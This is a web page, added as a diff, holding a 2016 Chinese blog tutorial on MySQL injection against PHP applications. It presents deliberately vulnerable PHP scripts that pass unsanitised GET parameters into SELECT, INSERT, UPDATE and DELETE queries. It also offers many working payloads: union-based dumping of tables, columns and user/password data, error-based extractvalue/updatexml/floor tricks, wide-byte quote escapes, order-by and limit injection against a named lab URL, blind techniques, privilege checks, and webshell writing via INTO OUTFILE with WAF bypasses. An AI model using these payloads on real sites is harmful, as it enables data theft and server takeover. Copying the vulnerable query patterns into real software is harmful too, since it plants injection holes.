@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="http://yoursite.com">
+  <title>php漏洞之mysql注入 | 0wen&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。在这篇文章中我会总结我以前遇到过的各种关于sql注入的手法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php漏洞之mysql注入">
+<meta property="og:url" content="http://yoursite.com/2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/index.html">
+<meta property="og:site_name" content="0wen's Blog">
+<meta property="og:description" content="所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。在这篇文章中我会总结我以前遇到过的各种关于sql注入的手法">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql11.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql18.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql19.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql20.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql21.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql22.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql23.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql24.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql25.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql26.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql27.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql28.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql29.png">
+<meta property="og:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql30.png">
+<meta property="og:updated_time" content="2016-12-21T08:15:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php漏洞之mysql注入">
+<meta name="twitter:description" content="所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。在这篇文章中我会总结我以前遇到过的各种关于sql注入的手法">
+<meta name="twitter:image" content="http://oi0rrylhh.bkt.clouddn.com/mysql11.png">
+  
+    <link rel="alternative" href="/atom.xml" title="0wen&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/main.css?v=4.0.0.css">
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="null" class="js-avatar">
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">0wen</a></h1>
+		</hgroup>
+
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/tags/随笔/">随笔</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+	        
+    		
+    			
+    			<a data-idx="0" q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+    			
+            
+    			
+    			<a data-idx="1" q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+    			
+            
+    			
+    			<a data-idx="2" q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
+    			
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/0wen001" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
+		        
+					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
+		        
+					<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
+		        
+					<a class="mail" target="_blank" href="mailto:1154324277@qq.com" title="mail"><i class="icon-mail"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"><i class="icon-sort"></i></div>
+  		<h1 class="header-author js-mobile-header hide">0wen</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="null" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">0wen</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/tags/随笔/">随笔</a></li>
+		        
+		        
+		        	<li><a href="/archives/">所有文章</a></li>
+		        
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/0wen001" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
+			        
+						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
+			        
+						<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
+			        
+						<a class="mail" target="_blank" href="mailto:1154324277@qq.com" title="mail"><i class="icon-mail"></i></a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      php漏洞之mysql注入
+    </h1>
+  
+
+        <a href="/2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/" class="archive-article-date">
+  	<time datetime="2016-11-06T13:57:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-11-06</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。<br>在这篇文章中我会总结我以前遇到过的各种关于sql注入的手法<br><a id="more"></a></p>
+<h1 id="mysql-union注入"><a href="#mysql-union注入" class="headerlink" title="mysql union注入"></a>mysql union注入</h1><h2 id="基于数字型"><a href="#基于数字型" class="headerlink" title="基于数字型"></a>基于数字型</h2><p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql11.png" alt="Alt text"></p>
+<p>本次演示所有注入漏洞都是基于上图测试代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user = $_GET[<span class="string">'user'</span>];</div><div class="line">$uuser = addslashes($user);</div><div class="line">$_mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</div><div class="line"><span class="keyword">if</span> (mysqli_connect_errno()) &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'数据库连接错误！错误代码：'</span>.mysqli_connect_error();</div><div class="line"><span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$_mysqli-&gt;set_charset(<span class="string">'gbk'</span>);</div><div class="line">$sql = <span class="string">"select * from sql_test where user = '$uuser'"</span>;</div><div class="line"><span class="keyword">echo</span> $sql.<span class="string">"</span></div><div class="line">";</div><div class="line">$results = $_mysqli-&gt;query($sql)  <span class="keyword">or</span> <span class="keyword">die</span>($_mysqli-&gt;error);</div><div class="line"><span class="keyword">if</span> ($results)&#123;</div><div class="line">$rows = $results-&gt;fetch_array();</div><div class="line"><span class="keyword">echo</span> <span class="string">"user:"</span>.$rows[<span class="number">1</span>];</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>利用方法如下：<br>poc：<code>-1 union select 1,user(),3</code></p>
+<p>其中，user()：当前用户 还可以替换为database():数据库、version():数据库版本、@@version_compile_os:服务器操作系统、@@datadir: 数据路径</p>
+<p>在渗透过程中，如果要是能够判断mysql具有读写权限，则我们就可以直接写马到web目录，进而获得webshell<br>1).判断是否有读写权限：<br>and (select count(*) from mysql.user)&gt;0<br>and (select count(file_priv) from mysql.user)&gt;0</p>
+<p>2)有了读写权限，我们还需要知道web目录的路径，这时候就需要我们自己的经验来获得了，如sql报错显示路径等。<br>使用load_file()进行读取、使用 into outfile 和 dumpfile，其中的路径和内容我们可以load_file(char(32,26,56,66))和load_file(0x633A5C626F6F742E696E69)来绕过某些waf</p>
+<p>3)如果没有读写权限，我们还可以使用information_schema进行查询库中表、列、字段信息.<br>a.查询表的信息：<a href="http://localhost/sql_injection/union.php?id=-1" target="_blank" rel="external">http://localhost/sql_injection/union.php?id=-1</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 0x74657374</p>
+<p>b.查询列的信息：<a href="http://localhost/sql_injection/union.php?id=-1" target="_blank" rel="external">http://localhost/sql_injection/union.php?id=-1</a> UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name =0x73716C5F74657374</p>
+<p>c.查询字段信息：<a href="http://localhost/sql_injection/union.php?id=-1" target="_blank" rel="external">http://localhost/sql_injection/union.php?id=-1</a> UNION SELECT 1,group_concat(id,0x3a,user,0x3a,pass),3 from sql_test</p>
+<h2 id="基于字符型的注入"><a href="#基于字符型的注入" class="headerlink" title="基于字符型的注入"></a>基于字符型的注入</h2><p>基于字符型的注入原理与数字型类似，主要区别在于单引号的闭合</p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>当使用gbk编码时，使用%df%27等闭合单引号后，参考数字型注入</p>
+<h1 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h1><h2 id="mysql常见三种报错："><a href="#mysql常见三种报错：" class="headerlink" title="mysql常见三种报错："></a>mysql常见三种报错：</h2><h3 id="floor-报错：-id-1-and-select-1-from-select-count-concat-user-floor-rand-0-2-x-from-information-schema-tables-group-by-x-a"><a href="#floor-报错：-id-1-and-select-1-from-select-count-concat-user-floor-rand-0-2-x-from-information-schema-tables-group-by-x-a" class="headerlink" title="floor()报错： id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)"></a>floor()报错： <code>id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></h3><p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql18.png" alt="Alt text"></p>
+<h3 id="extractvalue-id-1-and-extractvalue-1-concat-0x5c-select-user"><a href="#extractvalue-id-1-and-extractvalue-1-concat-0x5c-select-user" class="headerlink" title="extractvalue(): id=1 and (extractvalue(1,concat(0x5c,(select user()))))"></a>extractvalue(): <code>id=1 and (extractvalue(1,concat(0x5c,(select user()))))</code></h3><p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql19.png" alt="Alt text"></p>
+<h3 id="updatexml-id-1-and-updatexml-1-concat-0x5e24-select-user-0x5e24-1"><a href="#updatexml-id-1-and-updatexml-1-concat-0x5e24-select-user-0x5e24-1" class="headerlink" title="updatexml(): id=1 and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))"></a>updatexml(): <code>id=1 and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))</code></h3><p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql20.png" alt="Alt text"></p>
+<h2 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h2><p>示例代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user = $_GET[<span class="string">'user'</span>];</div><div class="line">$pass = $_GET[<span class="string">'pass'</span>];</div><div class="line">$_mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</div><div class="line"><span class="keyword">if</span> (mysqli_connect_errno()) &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'数据库连接错误！错误代码：'</span>.mysqli_connect_error();</div><div class="line"><span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$_mysqli-&gt;set_charset(<span class="string">'utf8'</span>);</div><div class="line">$sql = <span class="string">"INSERT INTO `sql_test`( `user`, `pass`) values ('$user','$pass')"</span>;</div><div class="line"></div><div class="line">$results = $_mysqli-&gt;query($sql)  <span class="keyword">or</span> <span class="keyword">die</span>($_mysqli-&gt;error);</div><div class="line"><span class="keyword">if</span>($results)&#123;</div><div class="line"><span class="keyword">echo</span> $sql.<span class="string">"</span></div><div class="line">";</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql21.png" alt="Alt text"><br>poc：<code>&#39; and (extractvalue(1,concat(0x7e,(select user()),0x7e))))-- -</code></p>
+<h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p>示例代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//update注入实例</span></div><div class="line"><span class="comment">//poc: ' or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - </span></div><div class="line"><span class="comment">// 如果没有 or die($_mysqli-&gt;error)呢？  该怎么利用</span></div><div class="line">$user = $_GET[<span class="string">'user'</span>];</div><div class="line">$pass = $_GET[<span class="string">'pass'</span>];</div><div class="line">$_mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</div><div class="line"><span class="keyword">if</span> (mysqli_connect_errno()) &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'数据库连接错误！错误代码：'</span>.mysqli_connect_error();</div><div class="line"><span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="comment">//update user set user=$user,pass=$pass</span></div><div class="line">$_mysqli-&gt;set_charset(<span class="string">'utf8'</span>);</div><div class="line">$sql = <span class="string">"update sql_test set user='$user',pass='$pass'"</span>;</div><div class="line"><span class="keyword">echo</span> $sql.<span class="string">"</span></div><div class="line">";</div><div class="line">$results = $_mysqli-&gt;query($sql)  <span class="keyword">or</span> <span class="keyword">die</span>($_mysqli-&gt;error);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql22.png" alt="Alt text"><br>poc：<code>&#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</code></p>
+<h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p>示例代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//delete注入实例</span></div><div class="line"><span class="comment">//poc: ' or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - </span></div><div class="line"><span class="comment">// 如果没有 or die($_mysqli-&gt;error)呢？  该怎么利用</span></div><div class="line">$user = $_GET[<span class="string">'user'</span>];</div><div class="line"><span class="comment">//$pass = $_GET['pass'];</span></div><div class="line">$_mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</div><div class="line"><span class="keyword">if</span> (mysqli_connect_errno()) &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'数据库连接错误！错误代码：'</span>.mysqli_connect_error();</div><div class="line"><span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="comment">//delete from user where user=$user</span></div><div class="line">$_mysqli-&gt;set_charset(<span class="string">'utf8'</span>);</div><div class="line">$sql = <span class="string">"delete from sql_test where user='$user'"</span>;</div><div class="line"><span class="keyword">echo</span> $sql.<span class="string">"</span></div><div class="line">";</div><div class="line">$results = $_mysqli-&gt;query($sql)  <span class="keyword">or</span> <span class="keyword">die</span>($_mysqli-&gt;error);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>poc: <code>&#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</code></p>
+<p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql23.png" alt="Alt text"></p>
+<h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p><code>select * from sql_test order by (SELECT 1 from (select count(*),concat(floor(rand(0)*2),(substring((select(user())),1,62)))a from information_schema.tables group by a)b);</code></p>
+<p><img src="http://oi0rrylhh.bkt.clouddn.com/mysql24.png" alt="Alt text"></p>
+<h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>这里以一道ctf题进行演示，地址为：<a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1" target="_blank" rel="external">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</a><br>poc:<br><code>procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)%23</code><br><img src="http://oi0rrylhh.bkt.clouddn.com/mysql25.png" alt="Alt text"></p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="基于表达式的盲注（ascii法）"><a href="#基于表达式的盲注（ascii法）" class="headerlink" title="基于表达式的盲注（ascii法）"></a>基于表达式的盲注（ascii法）</h2><p>首先了解几个关于mysql的函数:<br>(1).substring(expression, start, length)   返回字符、二进制、文本或图像表达<br>式的一部分<br>(2).assic(str)   最左边的字符串str返回的数值<br><img src="http://oi0rrylhh.bkt.clouddn.com/mysql26.png" alt="Alt text"><br>对于上面的union注入，还可以这样注入：<br><img src="http://oi0rrylhh.bkt.clouddn.com/mysql27.png" alt="Alt text"></p>
+<h2 id="基于表达式的盲注-正则表达式法"><a href="#基于表达式的盲注-正则表达式法" class="headerlink" title="基于表达式的盲注(正则表达式法)"></a>基于表达式的盲注(正则表达式法)</h2><p>poc : <code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND table_name REGEXP &#39;^s&#39; LIMIT 0,1)-- -</code><br><img src="http://oi0rrylhh.bkt.clouddn.com/mysql28.png" alt="Alt text"></p>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>首先来了解几个关于mysql的函数<br>(1).find_in_set(str,strlist)   查询字段(strlist)中包含(str)的结果<br>strlist 字段名 参数以”,”分隔 如 (1,2,6,8)<br>(2).mid(column_name,start[,length])<br><img src="http://oi0rrylhh.bkt.clouddn.com/mysql29.png" alt="Alt text"><br>(3).if(expr1,expr2,expr3) 如果expr1表达式为真，则返回expr2，否则返回expr3<br><img src="http://oi0rrylhh.bkt.clouddn.com/mysql30.png" alt="Alt text"></p>
+<h2 id="基于报错的时间盲注"><a href="#基于报错的时间盲注" class="headerlink" title="基于报错的时间盲注"></a>基于报错的时间盲注</h2><p><code>select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x</code></p>
+<h3 id="简化后："><a href="#简化后：" class="headerlink" title="简化后："></a>简化后：</h3><p><code>select count(*) from information_schema.tables group by concat(
+version(),floor(rand(0)*2))</code></p>
+<h3 id="关键表被禁后："><a href="#关键表被禁后：" class="headerlink" title="关键表被禁后："></a>关键表被禁后：</h3><p><code>select count(*) from information_schema.tables group by concat(
+version(),floor(rand(0)*2))</code></p>
+<h3 id="rand-被禁后"><a href="#rand-被禁后" class="headerlink" title="rand()被禁后"></a>rand()被禁后</h3><p><code>select min(@a:=1) from information_schema.tables group by concat
+(password,@a:=(@a+1)%2)</code></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+	<div class="article-category tagcloud">
+	<i class="icon-book icon"></i>
+	<a class="article-category-link" href="/categories/mysql/">mysql</a><a class="article-category-link" href="/categories/mysql/注入/">注入</a>
+	</div>
+
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2016/11/27/php-e6-bc-8f-e6-b4-9e-e4-b9-8b-e4-bb-a3-e7-a0-81-e6-89-a7-e8-a1-8c/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          php漏洞之代码执行
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89" data-title="php漏洞之mysql注入" data-url="http://yoursite.com/2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"ture"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 0wen
+    	</div>
+本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次, 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次
+
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true
+	}
+</script>
+
+<script src="/./main.js?v=4.0.0.js"></script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-friends" q-show="friends">
+  		
+        <ul class="search-ul">
+          
+            <li class="search-li">
+              <a href="http://drops.blbana.cc/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>BlBana</a>
+            </li>
+          
